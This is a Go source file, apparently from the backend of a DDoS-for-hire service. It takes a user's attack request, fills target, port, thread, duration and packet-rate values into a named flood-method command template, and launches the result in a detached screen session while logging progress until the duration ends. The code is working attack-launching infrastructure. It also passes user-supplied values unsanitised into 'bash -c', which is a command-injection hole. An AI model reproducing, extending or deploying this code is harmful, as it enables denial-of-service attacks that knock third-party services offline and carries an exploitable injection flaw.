package main

import (
	"context"
	"fmt"
	"os/exec"
	"os"
	"strconv"
	"strings"
	"time"
	"api/core/models/log"
)

var ongoing map[string]*attack

type attack struct {
	user     int
	target   string
	cmd      string
	duration int
	created  int64
	end      int64
}

func Attack(atk *AttackMessage) {
	threads, _ := strconv.Atoi(atk.Options.Threads)
	if threads > Config.MThread {
		threads = Config.MThread
		log.Printf("Max Threads for servers auto-set to %d", Config.MThread)
	}
	atk.Options.Threads = strconv.Itoa(threads)
	command, found := methods[strings.ToUpper(atk.Data.Method)]
if !found {
    log.Println("Method not found:", atk.Data.Method)
    return
}
cmdStr, ok := command.(string)
if !ok {
    log.Println("Command is not a valid string:", command)
    return
}
	replace := strings.NewReplacer(
		"$target", atk.Data.Target,
		"$threads", strconv.Itoa(threads),
		"$port", atk.Data.Port,
		"$time", atk.Data.Duration,
		"$pps", atk.Options.PPS,
	)
	commandnew := replace.Replace(cmdStr)
	log.Println("Final command:", commandnew)
	duration, _ := strconv.Atoi(atk.Data.Duration)

	a := &attack{
		user:    atk.Data.User,
		target:  atk.Data.Target,
		cmd:     commandnew,
		created: time.Now().Unix(),
		end:     time.Now().Unix() + int64(duration),
	}

	go a.flood(context.TODO(), commandnew)
}

func (atk *attack) flood(ctx context.Context, commandnew string) {
    // Create the bash command string for starting the screen session.
	cmdStr := fmt.Sprintf("screen -dmS Atk %s", commandnew)
	log.Println("Executing command:", cmdStr)

	// Execute the bash command to start the attack in a detached screen session.
	cmd := exec.Command("bash", "-c", cmdStr)
	cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
	if err := cmd.Start(); err != nil {
		log.Println("Error executing command:", err)
	} else {
		currentDir, _ := os.Getwd()
		log.Println("Current working directory:", currentDir)
		log.Println("Successfully started attack on target:", atk.target)
	}

	// Start a new goroutine to monitor the attack status
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				// Log periodic updates about the ongoing attack
				log.Println("Attack on target:", atk.target, "is still ongoing")
				
				// Check if the attack duration has passed
				if time.Now().Unix() > atk.end {
					// Attack has finished, log the end message
					log.Println("Attack finished on target:", atk.target)
					return // Exit the goroutine once the attack is over
				}
			}
		}
	}()
}
